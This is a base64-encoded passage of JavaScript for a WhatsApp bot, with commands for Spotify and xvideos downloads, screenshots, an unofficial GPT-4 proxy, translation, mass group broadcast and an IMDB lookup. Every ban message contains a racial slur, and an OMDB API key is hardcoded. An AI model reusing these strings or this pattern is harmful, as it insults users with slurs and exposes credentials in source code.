wbHkoYOKdjCBGYWlsZWQgdG8gcHJvY2VzcyBtZWRpYS4gUGxlYXNlIHRyeSBhZ2Fpbi5gKTsKICAgIH0KfQpicmVhazsgIApjYXNlICdzcG90aWZ5JzogewogIGlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogIGlmICghcSkgewogICAgcmV0dXJuIHJlcGx5KCdQbGVhc2UgcHJvdmlkZSBhIHNvbmcgbmFtZS4gRXhhbXBsZTogYHNwb3RpZnkgSGFubmFoIE1vbnRhbmEgYnkgSWNlIFNwaWNlYCcpOwogIH0KCiAgdHJ5IHsKICAgIGNvbnN0IHNlYXJjaEFwaVVybCA9IGBodHRwczovL2RyYWN1bGF6eXgteHl6ZHJhYy5oZi5zcGFjZS9hcGkvU3BvdGlmeT9xPSR7ZW5jb2RlVVJJQ29tcG9uZW50KHEpfWA7CiAgICBjb25zdCBzZWFyY2hSZXNwb25zZSA9IGF3YWl0IGF4aW9zLmdldChzZWFyY2hBcGlVcmwpOwogICAgY29uc3Qgc2VhcmNoRGF0YSA9IHNlYXJjaFJlc3BvbnNlLmRhdGE7CgogICAgaWYgKHNlYXJjaERhdGEuU1RBVFVTID09PSAyMDApIHsKICAgICAgY29uc3Qgc29uZ0RhdGEgPSBzZWFyY2hEYXRhLlNPTkc7CiAgICAgIGNvbnN0IHRyYWNrTmFtZSA9IHNvbmdEYXRhLnRpdGxlOwogICAgICBjb25zdCBhcnRpc3ROYW1lID0gc29uZ0RhdGEuYXJ0aXN0OwogICAgICBjb25zdCBhbGJ1bU5hbWUgPSBzb25nRGF0YS5hbGJ1bTsKICAgICAgY29uc3QgcmVsZWFzZURhdGUgPSBzb25nRGF0YS5yZWxlYXNlX2RhdGU7CiAgICAgIGNvbnN0IHNwb3RpZnlVcmwgPSBzb25nRGF0YS5zcG90aWZ5X3VybDsKICAgICAgY29uc3QgY292ZXJBcnQgPSBzb25nRGF0YS5jb3Zlcl9hcnQ7CgogICAgICBjb25zdCBtZXNzYWdlID0gYAoqVHJhY2s6KiAke3RyYWNrTmFtZX0KKkFydGlzdDoqICR7YXJ0aXN0TmFtZX0KKkFsYnVtOiogJHthbGJ1bU5hbWV9CipSZWxlYXNlIERhdGU6KiAke3JlbGVhc2VEYXRlfQoqU3BvdGlmeSBVUkw6KiAke3Nwb3RpZnlVcmx9CmA7CgogICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBpbWFnZTogeyB1cmw6IGNvdmVyQXJ0IH0sIGNhcHRpb246IG1lc3NhZ2UgfSwgeyBxdW90ZWQ6IG0gfSk7CgogICAgICAvLyBTcG90aWZ5IERvd25sb2FkZXIgQVBJIChVc2luZyB0aGUgdHJhY2sgVVJMIGZyb20gc2VhcmNoIEFQSSkKICAgICAgaWYgKHNwb3RpZnlVcmwpIHsKICAgICAgICB0cnkgewogICAgICAgICAgY29uc3QgZG93bmxvYWRBcGlVcmwgPSBgaHR0cHM6Ly9hcGlzLmRhdmlkY3lyaWx0ZWNoLm15LmlkL3Nwb3RpZnlkbD91cmw9JHtlbmNvZGVVUklDb21wb25lbnQoc3BvdGlmeVVybCl9YDsKICAgICAgICAgIGNvbnN0IGRvd25sb2FkUmVzcG9uc2UgPSBhd2FpdCBheGlvcy5nZXQoZG93bmxvYWRBcGlVcmwpOwogICAgICAgICAgY29uc3QgZG93bmxvYWREYXRhID0gZG93bmxvYWRSZXNwb25zZS5kYXRhOwoKICAgICAgICAgIGlmIChkb3dubG9hZERhdGEuc3RhdHVzID09PSAyMDAgJiYgZG93bmxvYWREYXRhLnN1Y2Nlc3MpIHsKICAgICAgICAgICAgY29uc3QgbXAzRG93bmxvYWRVUkwgPSBkb3dubG9hZERhdGEuRG93bmxvYWRMaW5rOwoKICAgICAgICAgICAgLy8gU2VuZCB0aGUgbXAzIGRvd25sb2FkIGxpbmsgYXMgYW4gYXVkaW8gZmlsZQogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewogICAgICAgICAgICBhdWRpbzogeyB1cmw6IG1wM0Rvd25sb2FkVVJMIH0sCiAgICAgICAgICAgIG1pbWV0eXBlOiAiYXVkaW8vbXBlZyIsCiAgICAgICAgICAgIHB0dDogZmFsc2UgLy8gRW5zdXJlcyBpdCdzIGEgbm9ybWFsIGF1ZGlvIGZpbGUsIE5PVCBhIHZvaWNlIG5vdGUKICAgICAgICB9LCB7IHF1b3RlZDogbSB9KTsKICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJlcGx5KGBTcG90aWZ5IGRvd25sb2FkIGZhaWxlZDogJHtkb3dubG9hZERhdGEubWVzc2FnZSB8fCAnVW5rbm93biBlcnJvcid9YCk7CiAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoZG93bmxvYWRFcnJvcikgewogICAgICAgICAgY29uc29sZS5lcnJvcigiRXJyb3IgaW4gc3BvdGlmeSBkb3dubG9hZDoiLCBkb3dubG9hZEVycm9yKTsKICAgICAgICAgIHJlcGx5KGBBbiBlcnJvciBvY2N1cnJlZCB3aGlsZSBkb3dubG9hZGluZyB0aGUgU3BvdGlmeSB0cmFjazogJHtkb3dubG9hZEVycm9yLm1lc3NhZ2UgfHwgJ1Vua25vd24gZXJyb3InfWApOwogICAgICAgIH0KICAgICAgfSBlbHNlIHsKICAgICAgICByZXBseSgiTm8gU3BvdGlmeSBVUkwgZm91bmQsIGNhbm5vdCBkb3dubG9hZCB0aGUgc29uZy4iKTsKICAgICAgfQoKICAgIH0gZWxzZSB7CiAgICAgIHJlcGx5KGBTcG90aWZ5IHNlYXJjaCBmYWlsZWQ6ICR7c2VhcmNoRGF0YS5tZXNzYWdlIHx8ICdVbmtub3duIGVycm9yJ31gKTsKICAgIH0KICB9IGNhdGNoIChlcnJvcikgewogICAgY29uc29sZS5lcnJvcigiRXJyb3IgaW4gc3BvdGlmeSBjb21tYW5kOiIsIGVycm9yKTsKICAgIHJlcGx5KGBBbiBlcnJvciBvY2N1cnJlZCB3aGlsZSBzZWFyY2hpbmcgZm9yIHRoZSBTcG90aWZ5IHRyYWNrOiAke2Vycm9yLm1lc3NhZ2UgfHwgJ1Vua25vd24gZXJyb3InfWApOwogIH0KICB9CiAgYnJlYWs7CiAgY2FzZSAieHZpZGVvZGwiOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIXRleHQpIHJldHVybiBtLnJlcGx5KGV4YW1wbGUoYHh2aWRlbyBsaW5rYCkpCi8vIENoZWNrIGlmIGxpbmsgaXMgZnJvbSB4dmlkZW8KaWYgKCF0ZXh0LmluY2x1ZGVzKCJ4dmlkZW9zLmNvbSIpKSByZXR1cm4gbS5yZXBseSgiTGluayBpcyBub3QgZnJvbSB4dmlkZW9zLmNvbSIpCmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7cmVhY3Q6IHt0ZXh0OiAn8J+AhCcsIGtleTogbS5rZXl9fSkKLy8gRmV0Y2hpbmcgdmlkZW8gZGF0YSBmcm9tIEFQSQp0cnkgewpsZXQgcmVzID0gYXdhaXQgZmV0Y2goYGh0dHBzOi8vYXBpLmFnYXR6Lnh5ei9hcGkveHZpZGVvZG93bj91cmw9JHtlbmNvZGVVUklDb21wb25lbnQodGV4dCl9YCk7CmxldCBqc29uID0gYXdhaXQgcmVzLmpzb24oKTsKCi8vIEJhZCByZXNwb25zZSBmcm9tIEFQSQppZiAoanNvbi5zdGF0dXMgIT09IDIwMCB8fCAhanNvbi5kYXRhKSB7CnRocm93ICJDYW5ub3QgZmluZCB2aWRlbyBmb3IgdGhpcyBVUkwuIjsKfQoKLy8gUmV0cmlldmluZyB2aWRlbyBpbmZvcm1hdGlvbiBmcm9tIEFQSQpsZXQgdmlkZW9EYXRhID0ganNvbi5kYXRhOwoKLy8gRG93bmxvYWQgdmlkZW9zIHVzaW5nIFVSTHMgb2J0YWluZWQgZnJvbSBBUEkKY29uc3QgdmlkZW9VcmwgPSB2aWRlb0RhdGEudXJsOwpjb25zdCB2aWRlb1Jlc3BvbnNlID0gYXdhaXQgZmV0Y2godmlkZW9VcmwpOwoKLy8gQ2hlY2sgaWYgdGhlIHZpZGVvIHdhcyBkb3dubG9hZGVkIHN1Y2Nlc3NmdWxseQppZiAoIXZpZGVvUmVzcG9uc2Uub2spIHsKdGhyb3cgIkZhaWxlZCB0byBkb3dubG9hZCB2aWRlby4iOwp9CgovLyBTZW5kIHZpZGVvCmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CnZpZGVvOiB7CnVybDogdmlkZW9VcmwsCn0sCmNhcHRpb246IGAqKlRpdGxlOioqICR7dmlkZW9EYXRhLnRpdGxlIHx8ICdObyB0aXRsZSd9XG5gICsKYCoqVmlld3M6KiogJHt2aWRlb0RhdGEudmlld3MgfHwgJ05vIHZpZXcgaW5mb3JtYXRpb24nfVxuYCArCmAqKlZvdGVzOioqICR7dmlkZW9EYXRhLnZvdGUgfHwgJ05vIHZvdGUgaW5mb3JtYXRpb24nfVxuYCArCmAqKkxpa2VzOioqICR7dmlkZW9EYXRhLmxpa2VfY291bnQgfHwgJ05vIGxpa2UgaW5mb3JtYXRpb24nfVxuYCArCmAqKkRpc2xpa2VzOioqICR7dmlkZW9EYXRhLmRpc2xpa2VfY291bnQgfHwgJ05vIGRpc2xpa2UgaW5mb3JtYXRpb24nfWAsCn0pOwphd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwge3JlYWN0OiB7dGV4dDogJycsIGtleTogbS5rZXl9fSkKfSBjYXRjaCAoZSkgewpjb25zb2xlLmxvZyhgRXJyb3IgZG93bmxvYWRpbmcgdmlkZW86ICR7ZX1gKTsKfQp9CmJyZWFrOwpjYXNlICd4dmlkZW9zZWFyY2gnOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgaWYgKCF0ZXh0KSByZXR1cm4gbS5yZXBseShleGFtcGxlKGBNaWxmYCkpCiAgdHJ5IHsKICAgIC8vIGNoZWNraW5nIGRhdGEgZnJvbSBhcGkKICAgIGxldCByZXMgPSBhd2FpdCBmZXRjaChgaHR0cHM6Ly9hcGkuYWdhdHoueHl6L2FwaS94dmlkZW8/bWVzc2FnZT0ke2VuY29kZVVSSUNvbXBvbmVudCh0ZXh0KX1gKTsKICAgIGxldCBqc29uID0gYXdhaXQgcmVzLmpzb24oKTsKCiAgICAvLyBjaGVja2luZyBhcGkgcmVzcG9uc2Ugc3RhdHVzCiAgICBpZiAoanNvbi5zdGF0dXMgIT09IDIwMCB8fCAhanNvbi5kYXRhIHx8IGpzb24uZGF0YS5sZW5ndGggPT09IDApIHsKICAgICAgdGhyb3cgJ05vIHZpZGVvcyBmb3VuZCBmb3IgdGhpcyBrZXl3b3JkLic7CiAgICB9CgogICAgLy8gZmV0Y2hpbmcgc2VhcmNoIGRhdGEgZnJvbSBhcGkKICAgIGxldCB2aWRlb3MgPSBqc29uLmRhdGE7CiAgICBsZXQgbWVzc2FnZSA9IGBBS0FORSBNRCDwn4CEXG54dmlkZW8gc2VhcmNoIHJlc3VsdFxuXG4gKiIke3RleHR9Iio6XG5gOwoKICAgIC8vIENvbXBvc2luZyBtZXNzYWdlcyB3aXRoIHZpZGVvIGluZm9ybWF0aW9uCiAgICB2aWRlb3MuZm9yRWFjaCh2aWRlbyA9PiB7CiAgICAgIG1lc3NhZ2UgKz0gYFRpdGxlOiAke3ZpZGVvLnRpdGxlIHx8ICdubyBuYW1lJ31cbmAgKwogICAgICAgICAgICAgICAgIGAgIER1cmF0aW9uOiAke3ZpZGVvLmR1cmF0aW9uIHx8ICdubyBkdXJhdGlvbid9XG5gICsKICAgICAgICAgICAgICAgICBgICBVUkw6ICR7dmlkZW8udXJsIHx8ICdubyBVUkwnfVxuYCArCiAgICAgICAgICAgICAgICAgYCAgVGh1bWJuYWlsOiAke3ZpZGVvLnRodW1iIHx8ICdubyB0aHVtYm5haWwnfVxuXG5gOwogICAgfSk7CgogICAgLy8gU2VuZGluZyBtZXNzYWdlcyB3aXRoIHZpZGVvIGxpc3RzCiAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewogICAgICB0ZXh0OiBtZXNzYWdlLAogICAgfSk7CgogIH0gY2F0Y2ggKGUpIHsKICAgIC8vIEhhbmRsaW5nIGVycm9ycyBhbmQgc2VuZGluZyBlcnJvciBtZXNzYWdlcwogICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIGBjYW4ndCBmZXRjaCByZXN1bHQgZnJvbSBxdWVyeWApOwogIH0KfQpicmVhazsKY2FzZSAnc3MnOgpjYXNlICdzc3dlYic6ewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKaWYgKCF0ZXh0KSByZXR1cm4gcmVwbHkoYFdoZXJlcyB0aGUgbGluayBicm8g8J+klD9gKQp0cnkgewpyaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBpbWFnZTogeyB1cmw6IGBodHRwczovL2RyYWN1bGF6eHkteHl6ZHJhYy5oZi5zcGFjZS9hcGkvU2NyZWVuc2hvdD91cmw9JHtlbmNvZGVVUklDb21wb25lbnQodGV4dCl9YCB9fSwgeyBxdW90ZWQ6IG19KQoJCQl9IGNhdGNoIHsKCSAgcmVwbHkoJ1llcywgdGhlcmUgaXMgYW4gZXJyb3IsIHBsZWFzZSByZXBvcnQgaXQgdG8gdGhlIG93bmVyIHNvIHRoYXQgaXQgY2FuIGJlIGZpeGVkLicpCgl9Cn0KYnJlYWs7CmNhc2UgInByb2ZpbGUiOiAKY2FzZSAicGZwMiI6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmNvbnN0IHBwVXJsID0gYXdhaXQgcmljaC5wcm9maWxlUGljdHVyZVVybChjaGF0LCAnaW1hZ2UnKQphd2FpdCByaWNoLnNlbmRNZXNzYWdlKAogICAgY2hhdCwgCiAgICB7IAogICAgICAgIGltYWdlOiB7CiAgICAgICAgICAgIHVybDogcHBVcmwKICAgICAgICB9LAogICAgICAgIGNhcHRpb246ICdIZXJlIGlzIHRoZSBwcm9maWxlIHBpY3R1cmUnCiAgICB9CikKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShyaWNoLnVzZXIuaWQsIHsgdGV4dDogcHBVcmwgfSApCn0KYnJlYWs7CmNhc2UgJ2FudGlsaW5rJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKaWYgKCFpc0NyZWF0b3IpIHJldHVybiBtLnJlcGx5KCJgYGBmb3IgT3duZXIgb25seWBgYC4iKTsKICAgIGlmICghbS5pc0dyb3VwKSByZXR1cm4gcmVwbHkoIlRoaXMgY29tbWFuZCBvbmx5IHdvcmtzIGluIGdyb3VwIGNoYXRzLiIpOwogICAgaWYgKCFpc0FkbWlucykgcmV0dXJuIHJlcGx5KCJPbmx5IGdyb3VwIGFkbWlucyBjYW4gdXNlIHRoaXMgY29tbWFuZC4iKTsKICAgIGlmICghYXJnc1swXSkgcmV0dXJuIHJlcGx5KGBFeGFtcGxlOiAke3ByZWZpeH1hbnRpbGluayBvbi9vZmZgKTsKCiAgICBpZiAoYXJnc1swXS50b0xvd2VyQ2FzZSgpID09PSAnb24nKSB7CiAgICAgICAgYW50aWxpbmtTdGF0dXNbbS5jaGF0XSA9IHRydWU7CiAgICAgICAgcmV0dXJuIHJlcGx5KCJBbnRpbGluayBpcyBub3cgKmVuYWJsZWQqIGluIHRoaXMgZ3JvdXAuIik7CiAgICB9IGVsc2UgaWYgKGFyZ3NbMF0udG9Mb3dlckNhc2UoKSA9PT0gJ29mZicpIHsKICAgICAgICBhbnRpbGlua1N0YXR1c1ttLmNoYXRdID0gZmFsc2U7CiAgICAgICAgcmV0dXJuIHJlcGx5KCJBbnRpbGluayBpcyBub3cgKmRpc2FibGVkKiBpbiB0aGlzIGdyb3VwLiIpOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gcmVwbHkoIlVzZSAnb24nIG9yICdvZmYnIG9ubHkuIik7CiAgICB9Cn0KYnJlYWs7CgpjYXNlICJkZXZpY2VpZCI6IHsKIGlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogCiAgaWYgKCFtLnF1b3RlZCkgewogICAgcmV0dXJuIG0ucmVwbHkoJypQbGVhc2UgcXVvdGUgYSBtZXNzYWdlIHRvIHVzZSB0aGlzIGNvbW1hbmQhKicpOwogIH0KCiAgdHJ5IHsKICAgIC8vIEdldCB0aGUgcXVvdGVkIG1lc3NhZ2UKICAgIGNvbnN0IHF1b3RlZE1zZyA9IGF3YWl0IG0uZ2V0UXVvdGVkTWVzc2FnZSgpOwoKICAgIGlmICghcXVvdGVkTXNnKSB7CiAgICAgIHJldHVybiBtLnJlcGx5KCcqQ291bGQgbm90IGZpbmQgdGhlIHF1b3RlZCBtZXNzYWdlISonKTsKICAgIH0KCiAgICBjb25zdCBtZXNzYWdlSWQgPSBxdW90ZWRNc2cua2V5LmlkOwogICAgY29uc3QgbWVzc2FnZUlkTGVuZ3RoID0gbWVzc2FnZUlkLmxlbmd0aDsKCiAgICBtLnJlcGx5KGBEZXZpY2UgSW5mb3JtYXRpb246XG5NZXNzYWdlIElEOiAke21lc3NhZ2VJZH1cbk1lc3NhZ2UgSUQgTGVuZ3RoOiAke21lc3NhZ2VJZExlbmd0aH1gKTsKICB9IGNhdGNoIChlcnIpIHsKICAgIG0ucmVwbHkoJ0Vycm9yIHJldHJpZXZpbmcgZGV2aWNlIGluZm9ybWF0aW9uOiAnICsgZXJyLm1lc3NhZ2UpOwogIH0KfQpicmVhazsKICAgIApjYXNlICdncHQ0JzogY2FzZSAnb3BlbmFpJzogY2FzZSAnYWknOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogIGlmICghdGV4dCkgcmV0dXJuIHJlcGx5KGBBc2sgbWUgYW55dGhpbmcgZXhhbXBsZSAke2NvbW1hbmR9IGhvdyBhcmUgeWl1IGApCmFzeW5jIGZ1bmN0aW9uIG9wZW5haSh0ZXh0LCBsb2dpYykgeyAvLyBNZW1idWF0IGZ1bmdzaSBvcGVuYWkgdW50dWsgZGlwYW5nZ2lsCiAgICBsZXQgcmVzcG9uc2UgPSBhd2FpdCBheGlvcy5wb3N0KCJodHRwczovL2NoYXRldmVyeXdoZXJlLmFwcC9hcGkvY2hhdC8iLCB7CiAgICAgICAgIm1vZGVsIjogewogICAgICAgICAgICAiaWQiOiAiZ3B0LTQiLAogICAgICAgICAgICAibmFtZSI6ICJHUFQtNCIsCiAgICAgICAgICAgICJtYXhMZW5ndGgiOiAzMjAwMCwgIC8vIFNlc3VhaWthbiB0b2tlbiBsaW1pdCBqaWthIGRpcGVybHVrYW4KICAgICAgICAgICAgInRva2VuTGltaXQiOiA4MDAwLCAgLy8gU2VzdWFpa2FuIHRva2VuIGxpbWl0IHVudHVrIG1vZGVsIEdQVC00CiAgICAgICAgICAgICJjb21wbGV0aW9uVG9rZW5MaW1pdCI6IDUwMDAsICAvLyBTZXN1YWlrYW4gamlrYSBkaXBlcmx1a2FuCiAgICAgICAgICAgICJkZXBsb3ltZW50TmFtZSI6ICJncHQtNCIKICAgICAgICB9LAogICAgICAgICJtZXNzYWdlcyI6IFsKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgInBsdWdpbklkIjogbnVsbCwKICAgICAgICAgICAgICAgICJjb250ZW50IjogdGV4dCwgCiAgICAgICAgICAgICAgICAicm9sZSI6ICJ1c2VyIgogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAicHJvbXB0IjogbG9naWMsIAogICAgICAgICJ0ZW1wZXJhdHVyZSI6IDAuNQogICAgfSwgeyAKICAgICAgICBoZWFkZXJzOiB7CiAgICAgICAgICAgICJBY2NlcHQiOiAiLyovIiwKICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IgogICAgICAgIH0KICAgIH0pOwogICAgCiAgICBsZXQgcmVzdWx0ID0gcmVzcG9uc2UuZGF0YTsKICAgIHJldHVybiByZXN1bHQ7Cn0KCmxldCBwZWkgPSBhd2FpdCBvcGVuYWkodGV4dCwgIiIpCm0ucmVwbHkocGVpKQp9CmJyZWFrOwpjYXNlICJ0cmFuc2xhdGUiOgpjYXNlICJ0ciI6ewogaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmxldCBsYW5nLCB0ZXh0CmlmIChhcmdzLmxlbmd0aCA+PSAyKSB7CmxhbmcgPSBhcmdzWzBdID8gYXJnc1swXSA6ICdpZCcsIHRleHQgPSBhcmdzLnNsaWNlKDEpLmpvaW4oJyAnKQp9IGVsc2UgaWYgKG0/LnF1b3RlZCAmJiBtPy5xdW90ZWQudGV4dCkgewpsYW5nID0gYXJnc1swXSA/IGFyZ3NbMF0gOiAnaWQnLCB0ZXh0ID0gbT8ucXVvdGVkLnRleHQKfSBlbHNlIHRocm93IGBFeDogJHt1c2VkUHJlZml4ICsgY29tbWFuZH0gaWQgaGVsbG8gaSBhbSByb2JvdGAKY29uc3QgdHJhbnNsYXRlID0gcmVxdWlyZSgnQHZpdGFsZXRzL2dvb2dsZS10cmFuc2xhdGUtYXBpJykKbGV0IHJlcyA9IGF3YWl0IHRyYW5zbGF0ZSh0ZXh0LCB7IHRvOiBsYW5nLCBhdXRvQ29ycmVjdDogdHJ1ZSB9KS5jYXRjaChfID0+IG51bGwpCmlmICghcmVzKSByZXR1cm4gcmVwbHkoYEVycm9yIDogTGFuZ3VhZ2UgIiR7bGFuZ30iIE5vdCBTdXBwb3J0ZWRgKQpyZXBseShgKkRldGVjdGVkIExhbmd1YWdlOiogJHtyZXMuZnJvbT8ubGFuZ3VhZ2UuaXNvfVxuICpUbyBMYW5ndWFnZToqICR7bGFuZ31cblxuICpUcmFuc2xhdGlvbjoqICR7cmVzLnRleHR9YC50cmltKCkpCn0KYnJlYWs7CmNhc2UgImRldmljZSI6CmNhc2UgImdldGRldmljZSI6IHsKCSBpZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICBpZiAoIW0ucXVvdGVkKSB7CiAgICByZXR1cm4gbS5yZXBseSgnKlBsZWFzZSBxdW90ZSBhIG1lc3NhZ2UgdG8gdXNlIHRoaXMgY29tbWFuZCEqJyk7CiAgfQoKICB0cnkgewogICAgLy8gR2V0IHRoZSBxdW90ZWQgbWVzc2FnZQogICAgY29uc3QgcXVvdGVkTXNnID0gYXdhaXQgbS5nZXRRdW90ZWRNZXNzYWdlKCk7CgogICAgaWYgKCFxdW90ZWRNc2cpIHsKICAgICAgcmV0dXJuIG0ucmVwbHkoJypDb3VsZCBub3QgZGV0ZWN0LCBwbGVhc2UgdHJ5IHdpdGggbmV3bHkgc2VudCBtZXNzYWdlISonKTsKICAgIH0KCiAgICBjb25zdCBtZXNzYWdlSWQgPSBxdW90ZWRNc2cua2V5LmlkOwoKICAgIC8vIERldGVybWluZSB0aGUgZGV2aWNlIHVzaW5nIHRoZSBnZXREZXZpY2UgZnVuY3Rpb24gZnJvbSBCYWlsZXlzCiAgICBjb25zdCBkZXZpY2UgPSBnZXREZXZpY2UobWVzc2FnZUlkKSB8fCAnVW5rbm93bic7CgogICAgbS5yZXBseShgVGhlIG1lc3NhZ2UgaXMgc2VudCBmcm9tICoke2RldmljZX0qIGRldmljZS5gKTsKICB9IGNhdGNoIChlcnIpIHsKICAgIG0ucmVwbHkoJ0Vycm9yIGRldGVybWluaW5nIGRldmljZTogJyArIGVyci5tZXNzYWdlKTsKICB9Cn0KYnJlYWs7CmNhc2UgJ2Jyb2FkY2FzdGltYWdlJzogY2FzZSAnYmNpbWFnZSc6IGNhc2UgJ2Jyb2FkY2FzdHZpZGVvJzogY2FzZSAnYnJvYWRjYXN0dmlkJzoKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghaXNDcmVhdG9yKSByZXR1cm4gbS5yZXBseSgiZm9yIE93bmVyIG9ubHkuIik7CiAgICAgICAgaWYgKCFxKSByZXR1cm4gcmVwbHkoYHJlcGx5IHRvIGFuIGltYWdlIHdpdGggeW91ciBkZXNpcmVkIHRleHQgYCkKICAgICAgICBsZXQgZ2V0R3JvdXBzID0gYXdhaXQgcmljaC5ncm91cEZldGNoQWxsUGFydGljaXBhdGluZygpCiAgICAgICAgbGV0IGdyb3VwcyA9IE9iamVjdC5lbnRyaWVzKGdldEdyb3Vwcykuc2xpY2UoMCkubWFwKGVudHJ5ID0+IGVudHJ5WzFdKQogICAgICAgIGxldCB4ZW9uY2FzdCA9IGdyb3Vwcy5tYXAodiA9PiB2LmlkKQogICAgICAgIHJlcGx5KGAgUG9zdGluZyBpbiAke3hlb25jYXN0Lmxlbmd0aH0gR3JvdXAgY2hhdCwgZGVlcCAke3hlb25jYXN0Lmxlbmd0aCAqIDEsNX0gc2Vjb25kYCkKICAgICAgICBmb3IgKGxldCBpIG9mIHhlb25jYXN0KSB7CmxldCB0eHQgPSBgJHtvd25lcm5hbWV9J3MgQnJvYWRjYXN0XG5cbk1lc3NhZ2UgOiAke3F9YAppZigvaW1hZ2UvLnRlc3QobWltZSkpIHsKbGV0IG1lZGlhID0gYXdhaXQgcXVvdGVkLmRvd25sb2FkKCkKYXdhaXQgcmljaC5zZW5kTWVzc2FnZShpLCB7IGltYWdlOm1lZGlhLCAgY2FwdGlvbjogdHh0LG1lbnRpb25zOnBhcnRpY2lwYW50cy5tYXAoYSA9PiBhLmlkKSB9KQp9CmlmKC92aWRlby8udGVzdChtaW1lKSl7CmxldCBtZWRpYSA9IGF3YWl0IHF1b3RlZC5kb3dubG9hZCgpCmF3YWl0IHJpY2guc2VuZE1lc3NhZ2UoaSwgeyB2aWRlbzptZWRpYSwgIGNhcHRpb246IHR4dCwgbWVudGlvbnM6cGFydGljaXBhbnRzLm1hcChhID0+IGEuaWQpIH0pCn0KICAgICAgICAgICAgfQogICAgICAgIHJlcGx5KGBUaGUgcmVzdWx0cyBhcmUgYnJvYWRjYXN0IGluIHRoZSBncm91cCAke3hlb25jYXN0Lmxlbmd0aH1gKSAgICAgIAogICAgICAgIGJyZWFrOwpjYXNlICdpbWJkJzoKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmlmICghdGV4dCkgcmV0dXJuIHJlcGx5KGBfTmFtZSBhIFNlcmllcyBvciBtb3ZpZWApCiAgICAgICAgICAgIGxldCBmaWRzID0gYXdhaXQgYXhpb3MuZ2V0KGBodHRwOi8vd3d3Lm9tZGJhcGkuY29tLz9hcGlrZXk9NzQyYjJkMDkmdD0ke3RleHR9JnBsb3Q9ZnVsbGApCiAgICAgICAgICAgIGxldCBpbWRidCA9ICIiCiAgICAgICAgICAgIGNvbnNvbGUubG9nKGZpZHMuZGF0YSkKICAgICAgICAgICAgaW1kYnQgKz0gIuKajeKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajVxuIiArICIgYGBgIElNREIgU0VBUkNIYGBgXG4iICsgIuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajuKajlxuIgogICAgICAgICAgICBpbWRidCArPSAi8J+OrFRpdGxlICAgICAgOiAiICsgZmlkcy5kYXRhLlRpdGxlICsgIlxuIgogICAgICAgICAgICBpbWRidCArPSAi8J+ThVllYXIgICAgICAgOiAiICsgZmlkcy5kYXRhLlllYXIgKyAiXG4iCiAgICAgICAgICAgIGltZGJ0ICs9ICLirZBSYXRlZCAgICAgIDogIiArIGZpZHMuZGF0YS5SYXRlZCArICJcbiIKICAgICAgICAgICAgaW1kYnQgKz0gIvCfk4ZSZWxlYXNlZCAgIDogIiArIGZpZHMuZGF0YS5SZWxlYXNlZCArICJcbiIKICAgICAgICAgICAgaW1kYnQgKz0gIuKPs1J1bnRpbWUgICAgOiAiICsgZmlkcy5kYXRhLlJ1bnRpbWUgKyAiXG4iCiAgICAgICAgICAgIGltZG